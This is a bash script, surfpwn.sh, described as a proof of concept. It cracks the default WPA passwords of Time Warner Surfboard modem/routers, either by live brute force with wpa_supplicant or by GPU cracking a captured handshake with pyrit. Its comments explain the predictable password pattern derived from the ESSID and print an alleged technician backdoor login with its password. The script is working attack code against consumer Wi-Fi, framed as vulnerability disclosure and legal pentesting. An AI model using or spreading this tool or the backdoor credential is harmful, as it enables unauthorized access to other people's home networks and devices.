#!/usr/bin/env bash

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
envir--()
{
WRN="\033[31m"   ## Warnings / Infinite Loops
INS="\033[1;32m" ## Instructions
OUT="\033[1;33m" ## Outputs
HDR="\033[1;34m" ## Headers
INP="\033[36m"   ## Inputs
}

trap--()
{
let atp-- ## Just in case you are saving the attempt number for later usage this is a decrease of one number to prevent killing after one cycle, but before the new cycle is complete...
clear
# echo -e "$OUT\nsurfpwn.sh Interface (1) killed at attempt #$atp"
echo -e "$OUT\nsurfpwn.sh killed at attempt #$atp using the file $work_dir/twpwn_psk\n$WRN"
# case $mult in
# 	y|Y) echo -e "$OUT\nsurfpwn.sh Interface (2) killed at attempt #$pta"
# 	kill -9 $dip;;
# esac

kill -9 $pid
exit 1
}
atp=1 ## Attempt Counter for Interface (1)
# pta=1 ## Attempt Counter for Interface (2)
##~~~~~~~~~~~~~~~~~~~~~~~~~~ END Starting Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
greet--()
{
clear
echo -e "$HDR\n\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$OUT
                         surfpwn.sh$HDR
  A Proof of Concept Tool Targeting Bad Manufacturer Practices

           Author:$OUT stryngs ----> \033[1;33minfo@ethicalreporting.org$INS
                Read Comments Prior to Usage$HDR

                    Version $OUT$current_ver$HDR (\033[1;33m$rel_date$HDR)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
sleep 1.5
}

dev_check--()
{
ifconfig $1 > /dev/null 2>&1
if [[ $? -ne 0 ]];then
	clear
	echo -e "$WRN\nDevice does NOT exist"
	sleep 1
	exit 1
fi
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Main functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
main--()
{
#selection= ## Menu Choice
clear
echo -e "$HDR\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------
              Attack Methodolgy
-------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Live Brute Force

2) GPU attack on 4-way Handshake

E)xit surfpwn$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
read selection
case $selection in
	1) config-- 
	brute--;;

	2) config--
	gpu--;;

	e|E) exit 0;;

	*) echo -e "$WRN\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	parse_menu--;;
esac
}

config--()
{
clear
## step 1 - Declare ESSID of the Router and Desired Interface
echo -e "$INP\nDeclare ESSID"
echo -ne $OUT
read essid

if [[ $selection = 1 ]]; then
	# echo -e "$INP\nAre We Using 2 Interfaces? (y/n)"
	# read mult
	mult=n
		case $mult in ## Yes, I need a * statement, too lazy right now...
			y|Y) echo -e "$INP\nDeclare Interface (1)"
			read dev
			dev_check-- $dev
			echo -e "$INP\nDeclare Interface (2)"
			read ved
			dev check-- $ved;;

			n|N) echo -e "$INP\nDeclare Interface"
			echo -en $OUT
			read dev
			dev_check-- $dev;;
	esac

	echo -e "$INP\nDeclare Sleep Time Between Cycles$WRN (Recommended Value No Lower Than .8)$INP"
	echo -en "$OUT"
	read sleep
fi

## step 2 - Build the list
first=`echo $essid | cut -c-7`
last=`echo $essid | cut -c8-`
echo -e $OUT
crunch 13 13 1234567890ABCDEF -t $first@@@@$last > $work_dir/twpwn_psk
}

brute--()
{
## step 3 - Build the engine to run this thing
trap trap-- INT  ## Due to the while loop, this will come in handy
iface--
# case $mult in
# 	y|Y) ecafi--;;
# esac

rm $work_dir/twpwn_logfile -rf > /dev/null 2>&1
# rm logfile_twpwn -rf > /dev/null 2>&1
echo -e $OUT
while read line; do
	pass=`echo $line`
### Eterm -b black -f white --pause --title "ArpSpoof Subnet $gt_way (GW)" -e arpspoof -i $spoof_dev $gt_way &  ## Something like this for a PID track perhaps?
### Perhaps even launch the whole thing past initital start with an Eterm, creating a PID that doesnt use the originating script terminal as the PID track?
	wpa_passphrase $essid $pass | wpa_supplicant -Dwext -i$dev -c/dev/stdin -f $work_dir/twpwn_logfile & pid=$?
	sleep $sleep
	grep negotiation $work_dir/twpwn_logfile > /dev/null
	if [[ $? -ne 1 ]];then
		echo -e "$OUT\n$pass is the PSK!"
		kill -9 $pid
		exit 0
	else
		echo -e "$WRN\nAttempt #$atp~~~> $pass ~~~> failed"
		let atp++
		killall -9 wpa_supplicant
		iface--
	fi

done < twpwn_psk
}

gpu--()
{
echo -e "$HDR\n
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                 GPU Attack Setup
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~$INP
1) Handshake Capture File		[$OUT$cap$INP]

2) Are We Using Optirun			[$OUT$opti$INP]

C)ontinue

E)xit Script$HDR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n$INP"
read init_var
case $init_var in
	1) echo -e "$INP\nCapture File Location"
	echo -en $OUT
	read cap
	### create cap file check
	clear
	gpu--;;

	2) echo -e "$INP\nOptirun? (yes/no)"
	echo -en $OUT
	read opti
	case $opti in
		y*|Y*) opti=YES;;
		n*|N*) opti=NO;;
		*) opti=;;
	esac

	clear
	gpu--;;

	c|C) if [[ -z $opti ]]; then
		gpu--
	else
		if [[ $opti = YES ]]; then
			echo -e $OUT
			optirun pyrit -r $cap -i twpwn_psk attack_passthrough
			exit 0
		else
			echo -e $OUT
			pyrit -r $cap -i twpwn_psk attack_passthrough
			exit 0
		fi

	fi;;

	e|E) reset
	echo -e "\n\n"
	exit 0;;

	*) gpu--;;
esac

}

iface--()
{
## Must bring down the interface repetitively to prevent errors
ifconfig $dev down
ifconfig $dev up
}

# ecafi--()
# {
# ## Must bring down the interface repetitively to prevent errors
# ifconfig $ved down
# ifconfig $ved up
# }

# backwards--()
# {
# while read enil;do
# 	ssap=`echo $enil`
# 	wpa_passphrase $essid $sapp | wpa_supplicant -Dwext -i$ved -c/dev/stdin -f logfile_twpwn & dip=$?
# 	sleep $sleep
# 	grep negotiation logfile_twpwn > /dev/null
# 	if [[ $? -ne 1 ]];then
# 		echo -e "$OUT\n$ssap is the PSK!"
# 		kill -9 $dip
# 		exit 0
# 	else
# 		echo -e "$WRN\nAttempt #$pta~~~> $sapp ~~~> failed"
# 		let pta++
# 		killall -9 wpa_supplicant
# 		iface--
# 	fi
# 
# done < psk_twpwn
# }
##~~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##
current_ver=1.0
rel_date="13 Oct 2012"
work_dir=`pwd`
envir--
if [[ "$UID" -ne 0 ]];then
	echo -e "$WRN\nMust be ROOT to run this script"
	exit 87
fi

if [[ -z $1  ]]; then
	greet--
	main--
else
	greet--
	exit 1
fi
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Launch Conditions ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


script_info--()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: surfpwn.sh
## Copyright (C) <2012>  <stryngs>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.ls
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to info@ethicalreporting.org

## Comments written with a triple # are notes to myself, please ignore them.
##_____________________________________________________________________________##


##~The Following Required Programs Should be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.
## wpa_passphrase
## wpa_supplicant
## crunch
## pyrit
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Would love to make brute--() faster ...  Probably need more capable language ~~~> C++ anyone?
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Add double NIC usage capability cutting the time to finish the full bruteforce by half
## The engine is already written for this, but Process ID #s are the issue as the current way I am doing PID tracking kills the script not the action of wpa_supplicant
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written as a proof of concept to show an inherit weakness in the Surfboard Modem/Router combos rented out by Time Warner in the Southern California Area (Nationwide now perhaps????).

## The main idea behind surfpwn.sh is that the company has three flaws with this specific device:
## 1) WiFi is on by default
## 2) WPS is enabled by default
## 3) The default password for the WiFi is a combination of the 1st seven letters of the ESSID, the 4th and 5th byte of the HFC MAC address (JackAss Value), and the last 2 characters of the ESSID.  It's bad enough when you BROADCAST parts of the password, let alone make it easy as all get out to BRUTEFORCE......
## I have checked multiple routers to ensure the math would be correct with regards to possible values.  After doing this and seeing my theory was correct, I decided to write surfpwn.sh
## The weakness in the WiFi password to where brute forcing is "doable" is that the JackAss Value only has 16 possible combinations: 0-9 && A-F <Based off hex>
## 16^4=65536 possible combinations for any device

## So you might wonder how is this any different than someone hooking up a linksys router in their home?
## Time Warner doesnt bother to tell the customer that the "modem" they are installing is really a WiFi Router/Modem combo.
## It would be one thing if they advertised this point blank to the customer, but they fail to do so.
## When you go to the store and purchase a router, you (for the most part we hope) know if it is a wired or wireless type.  If it is wireless it becomes YOUR responsibility to ensure it's security.

## I happened to be at work when the TW guy came and installed it.  My wife asked him about our router, and he happily hooked our router into the TW "modem".
## It would have been somewhat understandable if he would have mentioned to her that we didn't need our old router because the device he had hooked up was wireless anyways  >>>  FAIL

##  The hardest part about writing surfpwn.sh was creating an engine to run/kill wpa_supplicant accordingly.  I don't believe anything exists in the wild that does this.  It was a good experience for me learning to truly think outside the box and envision how to accomplish a new goal.

## On 12 July 2014, I made the decision to move fully to crunch (sweeter on the syntactic sugar side of things) for list creation.  The steps below have been kept for historical purposes.
## step 1 - define variables for dictionary building
##x=`echo $essid | cut -c-7` ## 1st part of psk is 1st 7 characters of essid
##z=`echo $essid | cut -c8-` ## last 2 characters of psk is last 2 characters of essid

## step 2 - create 1st part of psk in a file equivilent in length to $idiot
## counter=0
## rm  -rf $work_dir/first > /dev/null 2>&1
## while [[ $counter -lt 65536 ]];do echo $x >> $work_dir/first; let counter++; done

## step 3 - create last part of psk in a file equivilent in length to $idiot
## counter=0
## rm -rf $work_dir/last > /dev/null 2>&1
## while [[ $counter -lt 65536 ]];do echo $z >> $work_dir/last; let counter++; done

## step 4 - lets get crunchy and create the middle part of the psk in a file based off of 0-9 and A-F to $idiot
## rm -rf $work_dir/middle > /dev/null 2>&1
## crunch 4 4 0123456789ABCDEF -o $work_dir/middle
## reset

## step 5 - create the full psk file for our engine
## paste $work_dir/first $work_dir/middle $work_dir/last | tr -d '\011' > $work_dir/twpwn_psk

## step 5a - process multiple interfaces, must alter list, will do something cleaner later..
### Should use split and not tac.....
# case $mult in
# 	y|Y) tac ~/twpwn_psk > psk_twpwn;;
# esac

## step 6 - some house cleaning
## rm -rf $work_dir/first $work_dir/middle $work_dir/last > /dev/null 2>&1

## Something to ask yourself:
## WHY did Time Warner demand to Arris/Motorola that they install a backdoor to the webbased login of: technician:yZgO8Bvj
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Changing of $sleep to too low will result in errors, adjust accordingly to your system and distance to the AP
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## My wife:
## For always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking

## darkoperator:
## I derived my scripting style from him

## Awk:
## For taking the time to listen to me about the idea when suddenly the answer popped up.  Crazy how just having someone listen can provide an answer sometimes....

## dragorn:
## Listening to me one day about the hack, and informing me that I could use a dictionary attack against it.  I can't remember exactly how the conversation went, but he was right.  It took my ~18 hr hack down to 13 seconds!!!
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
sleep 0
}